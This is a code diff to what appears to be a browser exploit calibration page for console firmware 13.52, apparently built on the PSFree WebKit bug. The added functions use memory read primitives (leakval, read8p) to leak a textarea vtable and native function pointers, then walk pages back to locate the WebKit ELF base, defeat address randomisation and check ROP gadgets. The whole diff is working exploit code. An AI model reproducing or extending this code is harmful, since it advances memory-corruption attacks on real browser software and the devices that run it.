@@ -7,7 +7,9 @@ const lines = [];
 let busy = false;
 let ready = false;
 let exploit = null;
+let carrierRef = null;
 let nativeFn = null;
+let vtablePtr = null;
 let tableOff = null;
 let calibrated = null;
 let manualBase = null;
@@ -22,6 +24,8 @@ const ASSUMED_EXPM1 = parseInt(
     (params.get("expm1") || "2582880").replace(/^0x/i, ""),
     16
 );
+const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
+const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "2048", 10);
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
 
 const GADGET_CHECKS = [
@@ -99,7 +103,7 @@ function wireGroomBar() {
 }
 
 let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In, baseIn;
-let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnAssume, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
+let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnAssume, btnFindBase, btnFindBaseVtable, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
 let calBarEl;
 let scanMode = "lite";
 let scanIndex = 0;
@@ -152,6 +156,8 @@ function setUi() {
     setCalButton(btnSetExpm12, calReady);
     setCalButton(btnSetBase2, calReady);
     setCalButton(btnProbe, calReady);
+    setCalButton(btnFindBase, calReady);
+    setCalButton(btnFindBaseVtable, ready && !busy);
     if (btnCopy) btnCopy.disabled = busy || !calibrated;
     if (expm1In) expm1In.disabled = busy || !(ready && nativeFn);
     if (baseIn) baseIn.disabled = busy || !(ready && nativeFn);
@@ -190,6 +196,9 @@ function clearLkProgress() {
 
 const SS_PROBE_I = "wk-cal-probe-i";
 const SS_PROBE_LIST = "wk-cal-probe-n";
+const SS_FIND_BASE_I = "wk-cal-findbase-i";
+const SS_VTABLE_FIND_I = "wk-cal-vtable-find-i";
+const SS_VTABLE_PTR = "wk-vtablePtr";
 
 function ptrNum(fn) {
     return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
@@ -285,8 +294,8 @@ function liteHintDeltas(off, fn) {
 }
 
 function probeAlignedDeltas(fn) {
-    const minD = parseInt(params.get("min") || "0x2200000", 16);
-    const maxD = parseInt(params.get("max") || "0x2800000", 16);
+    const minD = parseInt(params.get("min") || "0x1e00000", 16);
+    const maxD = parseInt(params.get("max") || "0x2c00000", 16);
     const residue = ptrResidue(fn);
     const out = [];
     let d = (minD & ~(CAL_ALIGN_STEP - 1)) | residue;
@@ -308,15 +317,144 @@ function liteSpanK() {
     return 8;
 }
 
+function isBadRead(magic) {
+    return magic == null || BAD_READ_MAGICS.has(magic >>> 0);
+}
+
+function looksLikeNativeCode(magic) {
+    if (isBadRead(magic)) return false;
+    const b0 = magic & 0xff;
+    const b1 = (magic >>> 8) & 0xff;
+    if (b0 === 0x7f && b1 === 0x45) return false;
+    return b0 === 0x55 || b0 === 0x48 || b0 === 0x41 || b0 === 0x89 || b0 === 0xe9;
+}
+
 function captureNativeFn(p, off) {
     const mOff = off.wk_JSFunction_m_function || 0x28;
     const cell = p.leakval(Math.expm1);
+    mark("CAL-CELL", String(cell));
+    const paths = [];
+
     const mid = read8p(p, cell.add32(0x18));
-    if (!mid) return null;
-    const fn = read8p(p, mid.add32(mOff));
-    if (!fn) return null;
-    try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
-    return fn;
+    if (mid) {
+        for (const o of [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10, 0x0]) {
+            const fn = read8p(p, mid.add32(o));
+            if (fn && fn.hi > 0)
+                paths.push({ label: "cell+0x18 -> +0x" + o.toString(16), fn });
+        }
+    }
+    for (let o = 0x8; o <= 0x30; o += 8) {
+        const q = read8p(p, cell.add32(o));
+        if (q && q.hi > 0)
+            paths.push({ label: "cell+0x" + o.toString(16), fn: q });
+    }
+
+    let fallback = null;
+    for (let i = 0; i < paths.length; i++) {
+        const path = paths[i];
+        const code = read4p(p, path.fn);
+        mark("CAL-PATH-TRY", path.label + " fn=" + path.fn + " code=" + fmtMagic(code));
+        if (looksLikeNativeCode(code)) {
+            mark("CAL-NATIVEFN-PATH", path.label);
+            mark("CAL-CODE0", "read4@nativeFn=" + fmtMagic(code));
+            try { sessionStorage.setItem("wk-nativeFn", String(path.fn)); } catch (_) { }
+            return path.fn;
+        }
+        if (!isBadRead(code) && !fallback)
+            fallback = path.fn;
+    }
+
+    if (fallback) {
+        mark("CAL-WARN", "nativeFn using weak fallback " + fallback);
+        try { sessionStorage.setItem("wk-nativeFn", String(fallback)); } catch (_) { }
+        return fallback;
+    }
+
+    if (paths.length > 0 && paths[0].fn) {
+        mark("CAL-WARN", "no path looked like code — using first path");
+        return paths[0].fn;
+    }
+    return null;
+}
+
+function findBaseWalkAddr(fn, step) {
+    const fnNum = ptrNum(fn);
+    const page = fnNum & ~(CAL_ALIGN_STEP - 1);
+    const addrNum = page - step * CAL_ALIGN_STEP;
+    if (addrNum <= 0x100000) return null;
+    return ptrFromNum(addrNum);
+}
+
+function addrFromNumber(n) {
+    if (!(n > 0) || !Number.isFinite(n)) return null;
+    return ptrFromNum(Math.trunc(n));
+}
+
+function loadVtableOverride() {
+    try {
+        const raw = sessionStorage.getItem(SS_VTABLE_PTR);
+        return raw ? parseAddr(raw) : null;
+    } catch (_) { return null; }
+}
+
+function captureTextareaVtable(p, carrier) {
+    const cells = [];
+    if (carrier && carrier.textarea) {
+        try {
+            const leaked = p.leakval(carrier.textarea);
+            if (leaked) cells.push({ label: "leakval(textarea)", cell: leaked });
+        } catch (_) { }
+    }
+    if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
+        const held = addrFromNumber(carrier.textareaAddress);
+        if (held) cells.push({ label: "carrier.textareaAddress", cell: held });
+    }
+    if (cells.length === 0) {
+        mark("VTABLE-FAIL", "no textarea cell — re-run Start");
+        return null;
+    }
+
+    for (let ci = 0; ci < cells.length; ci++) {
+        const path = cells[ci];
+        mark("VTABLE-PATH", path.label + " cell=" + path.cell);
+        for (let io = 0; io < 3; io++) {
+            const implOff = [0x18, 0x10, 0x20][io];
+            const webcore = read8p(p, path.cell.add32(implOff));
+            if (!webcore || webcore.hi === 0) continue;
+            mark("VTABLE-TRY", "webcore+0x" + implOff.toString(16) + "=" + webcore);
+            for (let vo = 0; vo < 2; vo++) {
+                const vtOff = vo === 0 ? 0x0 : 0x8;
+                const vt = read8p(p, webcore.add32(vtOff));
+                if (!vt || vt.hi === 0) continue;
+                const entry0 = read4p(p, vt);
+                if (isBadRead(entry0)) continue;
+                mark("VTABLE-OK", path.label + " impl+0x" + implOff.toString(16)
+                    + " vtable=" + vt + " entry0=" + fmtMagic(entry0));
+                return { vtable: vt, webcore, jsCell: path.cell, implOff, vtOff };
+            }
+        }
+    }
+
+    mark("VTABLE-FAIL", "no vtable — check textarea paths above");
+    return null;
+}
+
+function ensureVtablePtr(p) {
+    if (vtablePtr) return vtablePtr;
+    vtablePtr = loadVtableOverride();
+    if (vtablePtr) {
+        mark("VTABLE-LOAD", "cached " + vtablePtr);
+        return vtablePtr;
+    }
+    if (!carrierRef) {
+        mark("VTABLE-FAIL", "no carrier — re-run Start");
+        return null;
+    }
+    const hit = captureTextareaVtable(p, carrierRef);
+    if (!hit) return null;
+    vtablePtr = hit.vtable;
+    try { sessionStorage.setItem(SS_VTABLE_PTR, String(vtablePtr)); } catch (_) { }
+    return vtablePtr;
 }
 
 function suggestedExpm1(fn, off) {
@@ -355,6 +493,30 @@ function tryElfOnce(p, fn, delta) {
     return { delta, base };
 }
 
+function applyBaseFound(base, via) {
+    const delta = nativeFn ? impliedExpm1FromBase(nativeFn, base) : 0;
+    try {
+        sessionStorage.removeItem(SS_PROBE_I);
+        sessionStorage.removeItem(SS_PROBE_LIST);
+        sessionStorage.removeItem(SS_FIND_BASE_I);
+        sessionStorage.removeItem(SS_VTABLE_FIND_I);
+        if (delta > 0) sessionStorage.setItem(SS_CANDIDATE, String(delta));
+        sessionStorage.setItem("wk-webkitBase", String(base));
+    } catch (_) { }
+    manualBase = base;
+    try { sessionStorage.setItem(SS_MANUAL_BASE, String(base)); } catch (_) { }
+    if (delta > 0 && expm1In) expm1In.value = delta.toString(16);
+    if (baseIn) baseIn.value = ptrNum(base).toString(16);
+    clearVerifyProgress();
+    updateResultPanel();
+    mark("CAL-ELF-HIT", via + " base=" + base
+        + (delta > 0 ? " expm1=0x" + delta.toString(16) : " (expm1 n/a)"));
+}
+
+function applyElfHit(delta, base) {
+    applyBaseFound(base, delta > 0 ? "expm1=0x" + delta.toString(16) : "walk");
+}
+
 function loadManualBaseOverride() {
     const raw = params.get("base") || sessionStorage.getItem(SS_MANUAL_BASE);
     return parseAddr(raw);
@@ -382,13 +544,21 @@ function updateResultPanel() {
             resultEl.textContent = "no verified expm1 yet";
             return;
         }
+        const elfLine = calibrated.assumed
+            ? (calibrated.elf
+                ? "ELF peek=ok (assumed path)"
+                : "ELF peek=FAIL got="
+                    + (calibrated.elfPeek == null ? "read-failed" : fmtMagic(calibrated.elfPeek))
+                    + " — base likely wrong")
+            : (calibrated.elf ? "ELF=ok" : "ELF=bad");
         resultEl.textContent = [
-            (calibrated.assumed ? "ASSUMED (not verified)\n" : ""),
+            (calibrated.assumed ? "ASSUMED (not fully verified)\n" : ""),
+            "nativeFn=" + (nativeFn ? String(nativeFn) : "?"),
             "expm1=0x" + calibrated.delta.toString(16),
             "webkit=" + calibrated.webkitBase,
             calibrated.libkernelBase ? "libkernel=" + calibrated.libkernelBase : "libkernel=(IAT not verified)",
             "gadgets=" + calibrated.gadgetOk + "/" + calibrated.gadgetTotal,
-            calibrated.elf ? "ELF=ok" : "ELF=bad",
+            elfLine,
         ].join("\n");
     }
 }
@@ -421,7 +591,8 @@ function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
         delta: useDelta,
         webkitBase: base,
         libkernelBase: libkernelBase || null,
-        elf: assumed ? null : true,
+        elf: assumed ? (opts.elfPeek === ELF_MAGIC) : true,
+        elfPeek: assumed ? opts.elfPeek : ELF_MAGIC,
         gadgetOk: gadgetOk || 0,
         gadgetTotal: GADGET_CHECKS.length,
         ok: true,
@@ -566,6 +737,8 @@ async function runStart() {
             throw err;
         }
         installP(carrier, { promote: params.get("promote") === "1" });
+        carrierRef = carrier;
+        vtablePtr = null;
         const p = window.p;
         if (!p) throw new Error("window.p missing");
 
@@ -579,10 +752,11 @@ async function runStart() {
         scanIndex = 0;
         scanList = [];
         try {
-            sessionStorage.removeItem("wk-cal-lite-i");
-            sessionStorage.removeItem("wk-cal-wide-i");
             sessionStorage.removeItem(SS_PROBE_I);
             sessionStorage.removeItem(SS_PROBE_LIST);
+            sessionStorage.removeItem(SS_FIND_BASE_I);
+            sessionStorage.removeItem(SS_VTABLE_FIND_I);
+            sessionStorage.removeItem(SS_VTABLE_PTR);
         } catch (_) { }
 
         ready = true;
@@ -598,15 +772,15 @@ async function runStart() {
             return;
         }
 
-        mark("HINT-CAL", "tap Assume expm1 to test with 0x2582880 — no verify reads");
+        mark("HINT-CAL", "best base leak: tap 2e Find base (vtable) — no expm1 needed");
         prefillSuggestedExpm1(nativeFn, tableOff);
 
         const pre = parseExpm1(params.get("expm1"));
         if (pre > 0 && expm1In) expm1In.value = pre.toString(16);
 
         updateResultPanel();
-        mark("NEXT", "tap Assume expm1 (test) OR Verify step");
-        state("primitive OK — Assume or Verify", "ok");
+        mark("NEXT", "tap 2e Find base (vtable) OR Assume expm1 (test)");
+        state("primitive OK — 2e vtable or Assume", "ok");
         try { if (expm1In) expm1In.focus(); } catch (_) { }
         if (calBarEl && calBarEl.scrollIntoView)
             try { calBarEl.scrollIntoView(false); } catch (_) { }
@@ -664,15 +838,9 @@ async function runScanStep(mode) {
             sessionStorage.removeItem(key);
         } catch (_) { }
         clearVerifyProgress();
-        if (expm1In) expm1In.value = hit.delta.toString(16);
-        if (baseIn && hit.base) baseIn.value = ptrNum(hit.base).toString(16);
-        manualBase = null;
-        try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
-        updateResultPanel();
-
-        mark("CAL-ELF-HIT", "expm1=0x" + hit.delta.toString(16) + " base=" + hit.base);
-        mark("CAL-MORE", "tap Verify step (1 read/tap) OR Set expm1 if skipping verify");
-        state("ELF hit — Verify step or Set expm1", "ok");
+        applyElfHit(hit.delta, hit.base);
+        mark("CAL-MORE", "tap Verify step (1 read/tap) OR Assume if skipping verify");
+        state("ELF hit — Verify or Assume", "ok");
     } finally {
         busy = false;
         setUi();
@@ -750,13 +918,139 @@ function runAssumeTest(fromStart) {
     if (window.p) {
         const magic = read4p(window.p, base);
         mark("CAL-ELF-PEEK", "read4@base=" + base + " got=" + fmtMagic(magic)
-            + " (info only — 0x464c457f = ELF header, not an input value)");
+            + " (want 0x464c457f at module start)");
+        if (magic === ELF_MAGIC) {
+            mark("CAL-ELF-PEEK", "ELF magic OK — 0x2582880 matches this nativeFn");
+        } else if (isBadRead(magic)) {
+            mark("CAL-WARN", "got " + fmtMagic(magic) + " at base — address wrong/unmapped");
+            mark("HINT", "2582880 not confirmed — tap 2d Find base (walks back from nativeFn)");
+        } else {
+            mark("CAL-WARN", "got " + fmtMagic(magic) + " — not ELF, expm1 likely wrong");
+        }
+        applyCalibration(delta, base, null, 0, { assumed: true, elfPeek: magic });
+    } else {
+        applyCalibration(delta, base, null, 0, { assumed: true, elfPeek: null });
     }
-
-    applyCalibration(delta, base, null, 0, { assumed: true });
     mark("HINT", "offsets live — use index_rw.html to peek webkitBase, or paste JSON");
     state("CAL-OK assumed — ready to test", "ok");
     setUi();
+}
+
+async function runFindBaseVtable() {
+    if (busy || !ready || !window.p || !carrierRef) return;
+    busy = true;
+    setUi();
+    preCalTrim();
+
+    const p = window.p;
+    const startPtr = ensureVtablePtr(p);
+    if (!startPtr) {
+        state("vtable leak failed", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
+
+    let step = 0;
+    try { step = parseInt(sessionStorage.getItem(SS_VTABLE_FIND_I) || "0", 10) || 0; } catch (_) { }
+
+    if (step >= FIND_BASE_MAX_STEPS) {
+        mark("CAL-FAIL", "vtable find-base exhausted " + FIND_BASE_MAX_STEPS + " pages back");
+        mark("HINT", "check VTABLE-OK line — vtable may be wrong impl offset");
+        state("vtable walk done — no ELF", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
+
+    const base = findBaseWalkAddr(startPtr, step);
+    if (!base) {
+        mark("CAL-FAIL", "vtable walk past valid range");
+        state("vtable walk stopped", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
+
+    mark("VTABLE-FIND", (step + 1) + "/" + FIND_BASE_MAX_STEPS
+        + " vtable=" + startPtr + " base=" + base + " (1 read)");
+
+    try {
+        await new Promise(r => setTimeout(r, 64));
+        const magic = read4p(p, base);
+        step++;
+        try { sessionStorage.setItem(SS_VTABLE_FIND_I, String(step)); } catch (_) { }
+
+        if (magic !== ELF_MAGIC) {
+            const tag = isBadRead(magic) ? " (bad/unmapped)" : "";
+            mark("ELF-MISS", fmtMagic(magic) + " @ " + base + tag);
+            mark("HINT", "keep tapping 2e Find base (vtable)");
+            state("vtable walk " + step + "/" + FIND_BASE_MAX_STEPS + " — tap again", "warn");
+            return;
+        }
+
+        applyBaseFound(base, "vtable-walk");
+        mark("NEXT", "Verify step to confirm gadgets (base is from vtable, not expm1)");
+        state("ELF found via vtable walk", "ok");
+    } finally {
+        busy = false;
+        setUi();
+    }
+}
+
+async function runFindBase() {
+    if (busy || !ready || !window.p || !nativeFn) return;
+    busy = true;
+    setUi();
+    preCalTrim();
+
+    let step = 0;
+    try { step = parseInt(sessionStorage.getItem(SS_FIND_BASE_I) || "0", 10) || 0; } catch (_) { }
+
+    if (step >= FIND_BASE_MAX_STEPS) {
+        mark("CAL-FAIL", "find-base exhausted " + FIND_BASE_MAX_STEPS + " pages back");
+        mark("HINT", "nativeFn may be wrong — check CAL-PATH-TRY lines; try ?pair=1 on Start");
+        state("find-base done — no ELF", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
+
+    const base = findBaseWalkAddr(nativeFn, step);
+    if (!base) {
+        mark("CAL-FAIL", "find-base walked past valid range");
+        state("find-base stopped", "bad");
+        busy = false;
+        setUi();
+        return;
+    }
+
+    const delta = impliedExpm1FromBase(nativeFn, base);
+    mark("FIND-BASE", (step + 1) + "/" + FIND_BASE_MAX_STEPS
+        + " base=" + base + " expm1=0x" + delta.toString(16) + " (1 read)");
+
+    try {
+        await new Promise(r => setTimeout(r, 64));
+        const magic = read4p(window.p, base);
+        step++;
+        try { sessionStorage.setItem(SS_FIND_BASE_I, String(step)); } catch (_) { }
+
+        if (magic !== ELF_MAGIC) {
+            const tag = isBadRead(magic) ? " (bad/unmapped)" : "";
+            mark("ELF-MISS", fmtMagic(magic) + " @ " + base + tag);
+            mark("HINT", "0xcccccccc = wrong address — keep tapping Find base");
+            state("find-base " + step + "/" + FIND_BASE_MAX_STEPS + " — tap again", "warn");
+            return;
+        }
+
+        try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
+        applyBaseFound(base, "nativeFn-walk");
+        mark("NEXT", "Verify step to confirm gadgets");
+        state("ELF found via walk-back", "ok");
+    } finally {
+        busy = false;
+        setUi();
+    }
 }
 
 async function runProbeElf() {
@@ -780,7 +1074,7 @@ async function runProbeElf() {
 
     if (i >= list.length) {
         mark("CAL-FAIL", "probe exhausted " + list.length + " aligned deltas");
-        mark("HINT", "2582880 may be wrong for 13.52 — try ?min=0x2000000&max=0x2a00000");
+        mark("HINT", "try 2d Find base (walk back from nativeFn) or ?min=0x1e00000&max=0x2c00000");
         state("probe done — no ELF", "bad");
         busy = false;
         setUi();
@@ -799,25 +1093,15 @@ async function runProbeElf() {
         try { sessionStorage.setItem(SS_PROBE_I, String(i)); } catch (_) { }
 
         if (magic !== ELF_MAGIC) {
-            mark("ELF-MISS", fmtMagic(magic) + " @ " + base);
+            mark("ELF-MISS", fmtMagic(magic) + " @ " + base
+                + (magic === 0xcccccccc ? " (unmapped/wrong addr)" : ""));
             state("probe " + i + "/" + list.length + " — tap Probe ELF again", "warn");
             return;
         }
 
-        try {
-            sessionStorage.removeItem(SS_PROBE_I);
-            sessionStorage.removeItem(SS_PROBE_LIST);
-        } catch (_) { }
-        if (expm1In) expm1In.value = delta.toString(16);
-        if (baseIn && base) baseIn.value = ptrNum(base).toString(16);
-        manualBase = null;
-        try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
-        try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
-        clearVerifyProgress();
-        updateResultPanel();
-        mark("CAL-ELF-HIT", "expm1=0x" + delta.toString(16) + " base=" + base);
-        mark("NEXT", "tap Set expm1 then Verify step from step 2");
-        state("ELF found — Set expm1 + Verify step", "ok");
+        applyElfHit(delta, base);
+        mark("NEXT", "tap Verify step or Assume");
+        state("ELF found — Verify or Assume", "ok");
     } finally {
         busy = false;
         setUi();
@@ -1040,6 +1324,8 @@ function init() {
     btnSetExpm12 = $("btn-set-expm1-2");
     btnSetBase2 = $("btn-set-base-2");
     btnProbe = $("btn-probe");
+    btnFindBase = $("btn-find-base");
+    btnFindBaseVtable = $("btn-find-base-vtable");
     calBarEl = $("cal-bar");
     btnCopy = $("btn-copy");
     btnClear = $("btn-clear");
@@ -1060,6 +1346,8 @@ function init() {
     wireClick(btnSetBase2, runSetBase);
     wireClick(btnAssume, function () { runAssumeTest(false); });
     wireClick(btnProbe, function () { return runProbeElf(); });
+    wireClick(btnFindBase, function () { return runFindBase(); });
+    wireClick(btnFindBaseVtable, function () { return runFindBaseVtable(); });
     wireClick(btnCopy, runCopy);
     wireClick(btnClear, function () {
         lines.length = 0;
@@ -1089,7 +1377,8 @@ function init() {
 
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "Assume expm1 = trust 0x2582880 (?trust=1 auto after Start)");
+    mark("BOOT", "2e Find base (vtable) = PSFree leak — best path, no expm1");
+    mark("BOOT", "2d Find base walks back from nativeFn until ELF");
     wireGroomBar();
     setUi();
     state("ready — pick groom if needed, then Start", "");
